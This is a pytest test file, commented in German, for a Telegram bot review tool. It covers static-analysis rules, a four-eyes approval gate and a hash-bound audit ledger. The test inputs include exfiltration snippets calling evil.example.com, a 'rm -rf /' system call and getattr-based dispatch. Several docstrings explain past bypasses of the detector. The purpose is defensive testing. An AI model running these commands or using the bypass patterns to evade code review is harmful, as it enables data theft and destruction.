"""Tests für :mod:`telegram_formatter.botkit.review` — Statik, Checkliste, Vier-Augen-Prinzip."""

from __future__ import annotations

from pathlib import Path

import pytest

from telegram_formatter.botkit.registry import BotRegistry
from telegram_formatter.botkit.review import (
    CHECKLIST_IDS,
    Reviewer,
    ReviewError,
    ReviewGate,
    ReviewGateError,
    ReviewLedger,
    ReviewRole,
    analyze_code,
    analyze_source,
    source_sha256,
)
from telegram_formatter.botkit.tokens import BotToken

ROOT = Path(__file__).resolve().parents[1]
SECRET = "123456789:" + "A" * 35
CLEAN_BOT = ROOT / "examples" / "own_bot" / "minimal_bot.py"
INSECURE_BOT = ROOT / "tests" / "fixtures" / "insecure_bot.py"

ALL_CHECKS = tuple(sorted(CHECKLIST_IDS))


class FakeClock:
    def __init__(self) -> None:
        self.now = 2_000.0

    def __call__(self) -> float:
        return self.now


def make_registry(bot_id: int = 123456789) -> BotRegistry:
    return BotRegistry(
        verify=lambda _secret: {
            "ok": True,
            "result": {"id": bot_id, "username": "mein_bot", "first_name": "Mein", "is_bot": True},
        },
        clock=FakeClock(),
    )


# --------------------------------------------------------------------------- #
# Statische Analyse
# --------------------------------------------------------------------------- #
def test_clean_reference_bot_has_no_findings():
    report = analyze_source(CLEAN_BOT)
    assert report.findings == [], report.as_text()
    assert report.ok is True


def test_insecure_bot_triggers_all_expected_rules():
    report = analyze_source(INSECURE_BOT)
    found = {f.rule_id for f in report.findings}
    assert found == {"BK001", "BK002", "BK003", "BK004", "BK005", "BK006", "BK007", "BK008",
                     "BK011", "BK012"}
    assert report.ok is False
    assert len(report.blocking) >= 10


def test_blockers_are_reported_with_file_and_line():
    report = analyze_source(INSECURE_BOT)
    finding = next(f for f in report.findings if f.rule_id == "BK006")
    assert finding.file.endswith("insecure_bot.py")
    assert finding.line > 0
    assert finding.severity == "blocker"


def test_telegram_api_calls_are_allowed():
    source = 'import requests\nrequests.post("https://api.telegram.org/botTOKEN/sendMessage")\n'
    report = analyze_code(source, filename="ok.py")
    assert report.ok is True


def test_dynamic_urls_are_blocked():
    """R-2: BK010 ist seit v2.4.0 ein Blocker — eine nicht prüfbare Ziel-URL
    darf nicht mehr als bloße Warnung durchgewunken werden."""
    source = "import requests\nrequests.post(url)\n"
    report = analyze_code(source, filename="dyn.py")
    assert report.ok is False
    assert {f.rule_id for f in report.findings} == {"BK010"}
    assert {f.rule_id for f in report.blocking} == {"BK010"}


def test_suppression_comment_works_and_is_visible():
    source = (
        'def handle(text: str) -> None:\n'
        '    print(text)  # botkit:allow BK011\n'
    )
    report = analyze_code(source, filename="suppressed.py")
    assert [f.rule_id for f in report.findings] == []


def test_report_text_is_human_readable():
    text = analyze_source(INSECURE_BOT).as_text()
    assert "Blocker" in text and "BK001" in text


# --------------------------------------------------------------------------- #
# Ledger & Gate
# --------------------------------------------------------------------------- #
def test_submit_blocked_code_raises():
    gate = ReviewGate(ReviewLedger(clock=FakeClock()), make_registry())
    with pytest.raises(ReviewGateError):
        gate.submit(123456789, INSECURE_BOT)


def test_two_independent_approvals_activate_the_bot():
    registry = make_registry()
    registry.register(BotToken.parse(SECRET), owner_ref="alice")
    gate = ReviewGate(ReviewLedger(clock=FakeClock()), registry)

    ticket = gate.submit(123456789, CLEAN_BOT)
    assert registry.is_approved(123456789) is False

    gate.approve(ticket.ticket_id, Reviewer("alice", ReviewRole.MAINTAINER), checks=ALL_CHECKS)
    assert registry.is_approved(123456789) is False  # Vier-Augen-Prinzip!

    gate.approve(ticket.ticket_id, Reviewer("bob", ReviewRole.CONTRIBUTOR), checks=ALL_CHECKS)
    assert registry.is_approved(123456789) is True

    gate.verify(123456789, CLEAN_BOT)  # darf nicht werfen


def test_same_person_cannot_approve_twice():
    gate = ReviewGate(ReviewLedger(clock=FakeClock()), make_registry())
    ticket = gate.submit(123456789, CLEAN_BOT)

    gate.approve(ticket.ticket_id, Reviewer("alice", ReviewRole.MAINTAINER), checks=ALL_CHECKS)
    with pytest.raises(ReviewError):
        gate.approve(ticket.ticket_id, Reviewer("alice", ReviewRole.MAINTAINER), checks=ALL_CHECKS)
    assert len(ticket.approvals) == 1  # dieselbe Person zählt nicht doppelt


def test_maintainer_approval_is_mandatory():
    gate = ReviewGate(ReviewLedger(clock=FakeClock()), make_registry())
    ticket = gate.submit(123456789, CLEAN_BOT)

    gate.approve(ticket.ticket_id, Reviewer("bob"), checks=ALL_CHECKS)
    gate.approve(ticket.ticket_id, Reviewer("carol"), checks=ALL_CHECKS)

    assert ticket.is_approved(min_approvals=2, require_maintainer=True) is False
    with pytest.raises(ReviewGateError):
        gate.verify(123456789, CLEAN_BOT)


def test_incomplete_checklist_is_rejected():
    gate = ReviewGate(ReviewLedger(clock=FakeClock()), make_registry())
    ticket = gate.submit(123456789, CLEAN_BOT)

    with pytest.raises(ReviewError):
        gate.approve(ticket.ticket_id, Reviewer("alice", ReviewRole.MAINTAINER), checks=("C1", "C2"))


def test_unknown_check_ids_are_rejected():
    gate = ReviewGate(ReviewLedger(clock=FakeClock()), make_registry())
    ticket = gate.submit(123456789, CLEAN_BOT)

    with pytest.raises(ReviewError):
        gate.approve(ticket.ticket_id, Reviewer("alice", ReviewRole.MAINTAINER),
                     checks=ALL_CHECKS + ("C99",))


def test_approval_is_bound_to_the_source_hash(tmp_path):
    registry = make_registry()
    registry.register(BotToken.parse(SECRET), owner_ref="alice")
    gate = ReviewGate(ReviewLedger(clock=FakeClock()), registry)
    ticket = gate.submit(123456789, CLEAN_BOT)
    gate.approve(ticket.ticket_id, Reviewer("alice", ReviewRole.MAINTAINER), checks=ALL_CHECKS)
    gate.approve(ticket.ticket_id, Reviewer("bob"), checks=ALL_CHECKS)

    modified = tmp_path / "minimal_bot.py"
    modified.write_text(Path(CLEAN_BOT).read_text(encoding="utf-8") + "\n# kleine Änderung\n",
                        encoding="utf-8")

    with pytest.raises(ReviewGateError):  # sha256 geändert -> kein Ticket
        gate.verify(123456789, modified)
    assert source_sha256(modified) != source_sha256(CLEAN_BOT)


def test_rejection_invalidates_approval():
    registry = make_registry()
    registry.register(BotToken.parse(SECRET), owner_ref="alice")
    gate = ReviewGate(ReviewLedger(clock=FakeClock()), registry)
    ticket = gate.submit(123456789, CLEAN_BOT)
    gate.approve(ticket.ticket_id, Reviewer("alice", ReviewRole.MAINTAINER), checks=ALL_CHECKS)
    gate.approve(ticket.ticket_id, Reviewer("bob"), checks=ALL_CHECKS)
    assert registry.is_approved(123456789) is True

    gate.reject(ticket.ticket_id, Reviewer("dave", ReviewRole.MAINTAINER),
                note="Logging-Pfad noch prüfen")
    assert registry.is_approved(123456789) is False


def test_decision_must_match_the_ticket_hash():
    ledger = ReviewLedger(clock=FakeClock())
    ticket = ledger.submit(123456789, "a" * 64)
    other = Reviewer("alice", ReviewRole.MAINTAINER)
    from telegram_formatter.botkit.review import ReviewDecision

    with pytest.raises(ReviewError):
        ledger.decide(ticket.ticket_id,
                      ReviewDecision(other, True, ALL_CHECKS, "", 1.0, "b" * 64))


def test_ledger_roundtrip_contains_metadata_only(tmp_path):
    from telegram_formatter.botkit.review import ReviewDecision

    ledger = ReviewLedger(clock=FakeClock())
    ticket = ledger.submit(123456789, "c" * 64, file="bot.py", static_findings=["BK010@3"])
    ledger.decide(ticket.ticket_id,
                  ReviewDecision(Reviewer("alice", ReviewRole.MAINTAINER), True, ALL_CHECKS,
                                 "ok", 2_000.0, "c" * 64))

    path = tmp_path / "reviews.json"
    ledger.save(path)
    restored = ReviewLedger.load(path)

    trail = restored.audit_trail()
    assert len(trail) == 1
    assert trail[0]["source_sha256"] == "c" * 64
    assert trail[0]["decisions"][0]["reviewer"] == "alice"
    assert trail[0]["decisions"][0]["role"] == "maintainer"
    assert "text" not in path.read_text(encoding="utf-8")  # keine Inhalte im Trail


def test_load_missing_ledger_returns_empty(tmp_path):
    assert ReviewLedger.load(tmp_path / "nicht-da.json").audit_trail() == []


def test_unknown_ticket_raises():
    gate = ReviewGate(ReviewLedger(clock=FakeClock()), make_registry())
    with pytest.raises(ReviewError):
        gate.approve("RV-UNKNOWN", Reviewer("alice"), checks=ALL_CHECKS)


def test_local_mode_without_registry():
    """Git-/CLI-Modus: Ledger ist autoritativ, Registry-Prüfungen entfallen."""
    gate = ReviewGate(ReviewLedger(clock=FakeClock()), registry=None)
    ticket = gate.submit(123456789, CLEAN_BOT)
    gate.approve(ticket.ticket_id, Reviewer("alice", ReviewRole.MAINTAINER), checks=ALL_CHECKS)
    gate.approve(ticket.ticket_id, Reviewer("bob"), checks=ALL_CHECKS)
    gate.verify(123456789, CLEAN_BOT)  # kein Registry-Fehler, weil registry=None


def test_invalid_reviewer_handles_are_rejected():
    for handle in ("", "x" * 65, "alice!"):
        with pytest.raises(ReviewError):
            Reviewer(handle)


# --------------------------------------------------------------------------- #
# Regressionstests aus dem Security-Audit 2026-09: die reproduzierten
# Gate-Bypasses (H-1) und das Rejection-Loch (B-3) müssen dauerhaft zu sein.
# --------------------------------------------------------------------------- #
class TestAuditBypassRegressions:
    def test_requests_alias_with_constant_url_is_blocked(self):
        """H-1/D: `import requests as rq` + konstante Fremd-URL war völlig unsichtbar."""
        src = (
            "import requests as rq\n"
            'def f():\n'
            '    return rq.get("https://evil.example.com/x")\n'
        )
        rep = analyze_code(src)
        assert not rep.ok
        assert "BK004" in {f.rule_id for f in rep.findings}

    def test_variable_url_folds_module_constant(self):
        """H-1/A: URL in Modul-Konstante — jetzt gefaltet und blockiert."""
        src = (
            "import requests\n"
            'EXFIL = "https://evil.example.com/collect"\n'
            'def leak(data):\n'
            "    requests.post(EXFIL, json=data)\n"
        )
        rep = analyze_code(src)
        assert not rep.ok
        assert "BK004" in {f.rule_id for f in rep.findings}

    def test_fstring_constant_prefix_resolves(self):
        """H-1/E: f"https://evil/{path}" — konstanter Kopf reicht für BK004."""
        rep = analyze_code(
            'import requests\nrequests.post(f"https://evil.example.com/{p}", json=d)\n'
        )
        assert "BK004" in {f.rule_id for f in rep.findings}

    def test_legit_api_base_fstring_stays_clean(self):
        """Gegentest: der minimale Referenz-Bot nutzt genau dieses Muster."""
        src = (
            "import requests\n"
            'API_BASE = "https://api.telegram.org"\n'
            'def call(token, method, payload):\n'
            '    requests.post(f"{API_BASE}/bot{token}/{method}", json=payload)\n'
        )
        # API_BASE bekannt -> nur der "{token}"-Teil ist dynamisch; das
        # Ergebnis darf kein BK004 sein.
        rep = analyze_code(src)
        assert "BK004" not in {f.rule_id for f in rep.findings}

    def test_importlib_and_tempfile_blocked(self):
        """H-1/B: Reflektion + temporäre Persistenz."""
        rep = analyze_code('import importlib\nm = importlib.import_module("os")\nm.system("ls")\n')
        assert "BK001" in {f.rule_id for f in rep.findings}
        rep = analyze_code("import tempfile\ntempfile.mkdtemp()\n")
        assert "BK001" in {f.rule_id for f in rep.findings}
        rep = analyze_code("from importlib import import_module\n")
        assert "BK001" in {f.rule_id for f in rep.findings}

    def test_annassign_and_dict_token_literals_blocked(self):
        """H-1/C: Token jenseits von ast.Assign."""
        rep = analyze_code('API_TOKEN: str = "123456789:AAH1bcDefGhIjKlMnOpQrStUvWxYz012345"\n')
        assert "BK006" in {f.rule_id for f in rep.findings}
        rep = analyze_code('CFG = {"key": "123456789:AAH1bcDefGhIjKlMnOpQrStUvWxYz012345"}\n')
        assert "BK006" in {f.rule_id for f in rep.findings}
        rep = analyze_code('configure(token="123456789:AAH1bcDefGhIjKlMnOpQrStUvWxYz012345")\n')
        assert "BK006" in {f.rule_id for f in rep.findings}

    def test_from_os_system_blocked(self):
        """H-1: `from os import system` + Naked-Call."""
        rep = analyze_code('from os import system\nsystem("rm -rf /")\n')
        assert "BK007" in {f.rule_id for f in rep.findings}

    def test_fixture_covers_new_detectors(self):
        """Das Negativbeispiel muss alle neuen Umgehungs-Muster feuern."""
        from pathlib import Path as _P
        rep = analyze_source(_P("tests/fixtures/insecure_bot.py"))
        assert rep.ok is False

    def test_rejection_blocks_verify_in_local_mode(self):
        """B-3: reject() musste den Gate auch ohne Registry schließen."""
        gate = ReviewGate(ReviewLedger(clock=FakeClock()), registry=None)
        ticket = gate.submit(42, CLEAN_BOT)
        gate.approve(ticket.ticket_id, Reviewer("alice", ReviewRole.MAINTAINER), checks=ALL_CHECKS)
        gate.approve(ticket.ticket_id, Reviewer("bob"), checks=ALL_CHECKS)
        gate.verify(42, CLEAN_BOT, check_registry=False)  # Zwischenschritt: frei

        gate.reject(ticket.ticket_id, Reviewer("carol"), note="Doch nicht ok")
        import pytest as _pt
        with _pt.raises(ReviewGateError):
            gate.verify(42, CLEAN_BOT, check_registry=False)

    def test_os_open_write_descriptor_persistence_blocked(self):
        """R-2: Persistenz über Deskriptoren (os.open + os.write) statt Dateinamen."""
        rep = analyze_code(
            "import os\n"
            "fd = os.open('/tmp/x', os.O_WRONLY | os.O_CREAT)\n"
            "os.write(fd, b'x')\n"
        )
        assert "BK002" in {f.rule_id for f in rep.findings}

    def test_getattr_dispatch_blocked(self):
        """R-2: indirekter Dispatch über getattr(obj, \"name\")(…)."""
        rep = analyze_code('import os\ngetattr(os, "system")("id")\n')
        assert "BK007" in {f.rule_id for f in rep.findings}
        rep = analyze_code('getattr(__builtins__, "eval")("1+1")\n')
        assert "BK003" in {f.rule_id for f in rep.findings}

    def test_readonly_os_open_is_allowed(self):
        """Gegentest: os.open ohne Schreib-Flags ist keine Persistenz."""
        rep = analyze_code('import os\nfd = os.open("/tmp/x", os.O_RDONLY)\n')
        assert "BK002" not in {f.rule_id for f in rep.findings}

    def test_legit_api_base_fstring_has_no_findings(self):
        """Gegentest: f-string mit bekannter API-Basis-Konstante bleibt sauber."""
        rep = analyze_code(
            "import requests\n"
            'API_BASE = "https://api.telegram.org"\n'
            'requests.post(f"{API_BASE}/bot{token}/sendMessage", json=d)\n'
        )
        assert "BK004" not in {f.rule_id for f in rep.findings}
        assert "BK010" not in {f.rule_id for f in rep.findings}

    def test_resubmission_after_reject_opens_new_ticket(self):
        """Aufhebungspfad: gleiches Ticket bleibt abgelehnt, Re-Submit erzeugt ein neues."""
        gate = ReviewGate(ReviewLedger(clock=FakeClock()), registry=None)
        old = gate.submit(42, CLEAN_BOT)
        gate.approve(old.ticket_id, Reviewer("alice", ReviewRole.MAINTAINER), checks=ALL_CHECKS)
        gate.reject(old.ticket_id, Reviewer("carol"), note="nein")
        fresh = gate.submit(42, CLEAN_BOT)
        assert fresh.ticket_id != old.ticket_id
        assert fresh.decisions == []


# --------------------------------------------------------------------------- #
# v2.11.1: BK005-Case, lesbare ReviewGate-/Ledger-Fehler
# --------------------------------------------------------------------------- #
def test_log_content_rule_ignores_logger_name_case():
    """BK005 greift auch für `LOGGER`/`Logger` — die übliche Konvention entging zuvor."""
    upper = analyze_code(
        'import logging\nLOGGER = logging.getLogger("x")\nLOGGER.info(f"got {message}")\n'
    )
    assert {f.rule_id for f in upper.findings} == {"BK005"}
    mixed = analyze_code(
        'import logging\nLogger = logging.getLogger("x")\nLogger.error(text)\n'
    )
    assert {f.rule_id for f in mixed.findings} == {"BK005"}


def test_verify_missing_file_raises_gate_error(tmp_path):
    """Fehlende Code-Datei meldet ReviewGateError statt rohem FileNotFoundError."""
    gate = ReviewGate(ReviewLedger(), registry=None)
    with pytest.raises(ReviewGateError, match="nicht lesbar"):
        gate.verify(123, tmp_path / "fehlt.py", check_registry=False)


def test_load_corrupt_ledger_raises_review_error(tmp_path):
    """Korrupter Audit-Trail meldet ReviewError statt JSONDecodeError/KeyError."""
    trail = tmp_path / "reviews.json"
    trail.write_text("{kein valides json", encoding="utf-8")
    with pytest.raises(ReviewError, match="beschädigt"):
        ReviewLedger.load(trail)
    trail.write_text('[{"ticket_id": "RV-1"}]', encoding="utf-8")
    with pytest.raises(ReviewError, match="beschädigt"):
        ReviewLedger.load(trail)
    trail.write_text('{"keine": "liste"}', encoding="utf-8")
    with pytest.raises(ReviewError, match="beschädigt"):
        ReviewLedger.load(trail)


# ---------------------------------------------------------------------------
# Regression v2.13.0 — Code-Review
# ---------------------------------------------------------------------------
class TestBK004NotBypassable:
    """Der Exfiltrations-Blocker war über `http.client` und `urllib3` umgehbar.

    v2.12.0 prüfte nur Aufrufe, deren aufgelöster Name auf einen HTTP-Methoden-
    namen *und* eine bekannte Modulwurzel zeigt:

        import http.client
        c = http.client.HTTPSConnection("evil.example.com")   # nicht erfasst
        c.request("POST", "/collect", body=payload)           # root == "c"

    `_resolve_call_name("c.request")` liefert ``"c.request"`` unverändert,
    ``root == "c"`` ist nicht in ``HTTP_MODULE_ROOTS`` — `_check_http_target`
    lief nie, und `botctl review` meldete "keine Befunde".
    """

    @staticmethod
    def _rules(source: str) -> set[str]:
        return {f.rule_id for f in analyze_code(source, filename="bot.py").findings}

    def test_http_client_exfiltration_is_blocked(self):
        rules = self._rules(
            "import http.client\n"
            'c = http.client.HTTPSConnection("evil.example.com")\n'
            'c.request("POST", "/collect", body=payload)\n'
        )
        assert "BK004" in rules
        assert "BK010" in rules  # Folgeaufruf über Alias-Handle nicht prüfbar

    def test_urllib3_is_forbidden_and_blocked(self):
        rules = self._rules(
            "import urllib3\n"
            'r = urllib3.PoolManager("evil.example.com")\n'
            'r.request("POST", "/collect", body=p)\n'
        )
        assert "BK001" in rules  # Import
        assert "BK004" in rules  # Ziel-Host
        assert "BK010" in rules  # Folgeaufruf

    def test_urllib3_alias_import_also_blocked(self):
        rules = self._rules(
            "import urllib3 as u3\n"
            'r = u3.PoolManager("evil.example.com")\n'
            "r.request('POST', '/x', body=p)\n"
        )
        assert {"BK001", "BK004"} <= rules

    def test_allowed_host_still_passes(self):
        """Kein False Positive: `api.telegram.org` bleibt erlaubt."""
        assert not self._rules(
            "import http.client\n"
            'c = http.client.HTTPSConnection("api.telegram.org")\n'
            'c.request("GET", "/getMe")\n'
        )
        assert not self._rules(
            'import requests\nrequests.post("https://api.telegram.org/bot1/x", json=d)\n'
        )

    def test_unresolvable_host_is_not_silently_allowed(self):
        rules = self._rules(
            "import http.client\n"
            "c = http.client.HTTPSConnection(host_var)\n"
            'c.request("GET", "/getMe")\n'
        )
        assert "BK010" in rules


class TestBK002Precision:
    """BK002 meldete gewöhnliche Builtins als BLOCKER — `set()` stoppte jedes Review.

    ``PERSISTENCE_CALLS`` wird gegen den letzten Namensbestandteil geprüft und
    enthält `set`, `remove` und `save`. Damit waren `seen = set()`,
    `results.remove(x)` und `cfg.save()` Blocker. Die Methoden-Version meldet
    jetzt nur noch, wenn der Empfänger auf einen bekannten persistenz-
    verdächtigen Typ auflösbar ist; sonst greift BK010 („nicht prüfbar").
    """

    @staticmethod
    def _rules(source: str) -> set[str]:
        return {f.rule_id for f in analyze_code(source, filename="bot.py").findings}

    @pytest.mark.parametrize(
        "source",
        [
            "seen = set()\nseen.add(1)\n",
            "results = [1, 2]\nresults.remove(1)\n",
            "cfg = Config()\ncfg.save()\n",
            "client = get_client()\nclient.remove(1)\n",
        ],
    )
    def test_no_false_blocker(self, source):
        rules = self._rules(source)
        # BK002 (persistenzverdächtig) darf nicht mehr anschlagen …
        assert "BK002" not in rules
        # … aber „nicht prüfbar" wird, wo zutreffend, als BK010 gesagt.
        assert rules <= {"BK010"}

    @pytest.mark.parametrize(
        "source",
        [
            "from pathlib import Path\nPath('x').write_text(d)\n",
            "from pathlib import Path\np = Path('x')\np.unlink()\n",
            "import os\nos.makedirs('/tmp/x')\n",
            "import os\nos.remove('x')\n",
        ],
    )
    def test_real_persistence_still_blocked(self, source):
        assert "BK002" in self._rules(source)

    def test_signal_connect_is_not_persistence(self):
        assert not self._rules("import signal\nsignal.connect(handler)\n")


class TestOpenModes:
    """`open(p, "r+")` war ein False Negative: `+` heisst lesen UND schreiben."""

    @staticmethod
    def _rules(source: str) -> set[str]:
        return {f.rule_id for f in analyze_code(source, filename="bot.py").findings}

    @pytest.mark.parametrize("mode", ["w", "a", "x", "w+", "r+", "a+", "wb", "r+b"])
    def test_writable_modes_blocked(self, mode):
        assert "BK002" in self._rules(f'f = open(p, "{mode}")\n')

    @pytest.mark.parametrize("source", ['f = open(p, "r")\n', 'f = open(p, "rb")\n', "f = open(p)\n"])
    def test_read_only_modes_allowed(self, source):
        # `open(p)` ohne mode ist laut Python-Doku äquivalent zu `open(p, "r")`.
        assert "BK002" not in self._rules(source)


class TestRandomImportAsymmetry:
    """`from random import choice` ergab BK012, `import random` nicht."""

    def test_plain_import_random_flagged(self):
        rules = {f.rule_id for f in analyze_code("import random\n", filename="b.py").findings}
        assert "BK012" in rules

    def test_aliased_import_random_flagged(self):
        src = "import random as rnd\nrnd.random()\n"
        rules = {f.rule_id for f in analyze_code(src, filename="b.py").findings}
        assert "BK012" in rules


class TestBK006NoDuplicates:
    """Ein hartkodiertes Token ergab ZWEI BK006-Befunde auf derselben Zeile.

    `visit_Assign` meldete es, und `generic_visit` lief danach in
    `visit_Constant` für denselben Knoten. Weil `submit()` die Befunde in den
    Audit-Trail protokolliert, lagen die Duplikate dauerhaft dort.
    """

    def test_one_finding_per_token_literal(self):
        src = 'TOKEN = "123456789:AAEaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\n'
        findings = [
            f for f in analyze_code(src, filename="b.py").findings if f.rule_id == "BK006"
        ]
        assert len(findings) == 1

    def test_secret_names_still_flagged(self):
        """Der Zweig für sprechende Zielnamen bleibt erhalten."""
        src = 'API_KEY = "sk-abc123"\n'
        rules = {f.rule_id for f in analyze_code(src, filename="b.py").findings}
        assert "BK006" in rules

    def test_fixture_has_no_duplicates(self):
        report = analyze_source(INSECURE_BOT)
        hits = [f for f in report.findings if f.rule_id == "BK006"]
        assert len(hits) == len({(f.line, f.rule_id) for f in hits})


class TestLedgerBindsToBytes:
    """`submit` und `verify` berechneten verschiedene SHA-256 für dieselbe Datei.

    `submit` reichte `report.source_sha256` ein (über `read_text`, das CRLF zu
    LF normalisiert), `verify` prüfte `source_sha256` (über `read_bytes`). Bei
    einem CRLF-Checkout — `core.autocrlf`, Windows, einzelne `\\r` — waren die
    Werte nie gleich, und die Freigabe war dauerhaft unmöglich.
    """

    CHECKS = tuple(f"C{i}" for i in range(1, 10))

    def _gate(self):
        return ReviewGate(ReviewLedger(), registry=None)

    def _approve_twice(self, gate, ticket):
        gate.approve(ticket.ticket_id, Reviewer("alice", ReviewRole.MAINTAINER),
                     checks=self.CHECKS)
        gate.approve(ticket.ticket_id, Reviewer("bob"), checks=self.CHECKS)

    def test_crlf_file_can_be_approved_and_verified(self, tmp_path):
        bot = tmp_path / "bot.py"
        bot.write_bytes(b"# bot\r\nx = 1\r\n")  # CRLF-Checkout
        gate = self._gate()
        ticket = gate.submit(42, bot)
        self._approve_twice(gate, ticket)
        gate.verify(42, bot, check_registry=False)  # darf nicht werfen

    def test_report_hash_still_differs_from_byte_hash(self, tmp_path):
        """Dokumentiert die Ursache: die beiden Hashes sind definitionsgemäß
        verschieden. `submit` bindet deshalb ausdrücklich an die Bytes."""
        bot = tmp_path / "bot.py"
        bot.write_bytes(b"# bot\r\nx = 1\r\n")
        report = analyze_source(bot)
        assert report.source_sha256 != source_sha256(bot)

    def test_changed_bytes_are_rejected(self, tmp_path):
        bot = tmp_path / "bot.py"
        bot.write_bytes(b"# bot\r\nx = 1\r\n")
        gate = self._gate()
        ticket = gate.submit(42, bot)
        self._approve_twice(gate, ticket)
        bot.write_bytes(b"# bot\nx = 1\n")  # LF statt CRLF
        with pytest.raises(ReviewGateError):
            gate.verify(42, bot, check_registry=False)

    def test_identical_bytes_still_verify(self, tmp_path):
        bot = tmp_path / "bot.py"
        bot.write_bytes(b"# bot\r\nx = 1\r\n")
        gate = self._gate()
        ticket = gate.submit(42, bot)
        self._approve_twice(gate, ticket)
        bot.write_bytes(b"# bot\r\nx = 1\r\n")
        gate.verify(42, bot, check_registry=False)

    def test_submit_reuses_supplied_report(self, tmp_path, monkeypatch):
        """Der Report wird nicht ein zweites Mal erzeugt (Doppel-Lesen weg)."""
        bot = tmp_path / "bot.py"
        bot.write_text("# bot\nx = 1\n", encoding="utf-8")
        gate = self._gate()
        report = gate.analyze(bot)
        calls = []
        real = gate.analyze
        monkeypatch.setattr(gate, "analyze", lambda p: (calls.append(p), real(p))[1])
        gate.submit(7, bot, report=report)
        assert calls == []  # wurde der bereits berechnete Report benutzt


class TestLedgerWriteIsAtomic:
    """`save` kürzte den Audit-Trail in place — ein Absturz machte ihn unbrauchbar.

    `write_text` öffnet mit "w". Der `flock` in `_ledger_transaction` verhindert
    gleichzeitige Schreiber, aber keinen Kill, keine volle Platte und keinen
    Stromausfall zwischen Kürzen und letztem Byte. Danach meldet `load()`
    "ist beschädigt" — und mit dem Trail sind **alle** Freigaben verloren.
    """

    def test_readable_before_and_after(self, tmp_path):
        trail = tmp_path / "reviews.json"
        ledger = ReviewLedger()
        ledger.submit(1, "a" * 64, file="bot.py")
        ledger.save(trail)
        assert ReviewLedger.load(trail).ticket_for(1, "a" * 64) is not None
        ledger.submit(2, "b" * 64, file="bot2.py")
        ledger.save(trail)
        assert ReviewLedger.load(trail).ticket_for(2, "b" * 64) is not None

    def test_failure_does_not_destroy_existing_trail(self, tmp_path, monkeypatch):
        trail = tmp_path / "reviews.json"
        ledger = ReviewLedger()
        ledger.submit(1, "a" * 64, file="bot.py")
        ledger.save(trail)
        original = trail.read_text(encoding="utf-8")

        # os.replace scheitert -> der alte Trail muss unangetastet bleiben.
        def boom(*_a, **_kw):
            raise OSError(28, "No space left on device")

        monkeypatch.setattr("telegram_formatter.botkit.review.os.replace", boom)
        ledger.submit(2, "b" * 64, file="bot2.py")
        with pytest.raises(ReviewError, match="nicht schreibbar"):
            ledger.save(trail)
        assert trail.read_text(encoding="utf-8") == original
        assert ReviewLedger.load(trail).ticket_for(1, "a" * 64) is not None

    def test_no_temp_file_left_behind(self, tmp_path, monkeypatch):
        trail = tmp_path / "reviews.json"
        ledger = ReviewLedger()
        ledger.submit(1, "a" * 64, file="bot.py")

        def boom(*_a, **_kw):
            raise OSError(28, "No space left on device")

        monkeypatch.setattr("telegram_formatter.botkit.review.os.replace", boom)
        with pytest.raises(ReviewError):
            ledger.save(trail)
        assert list(tmp_path.glob("*.tmp")) == []
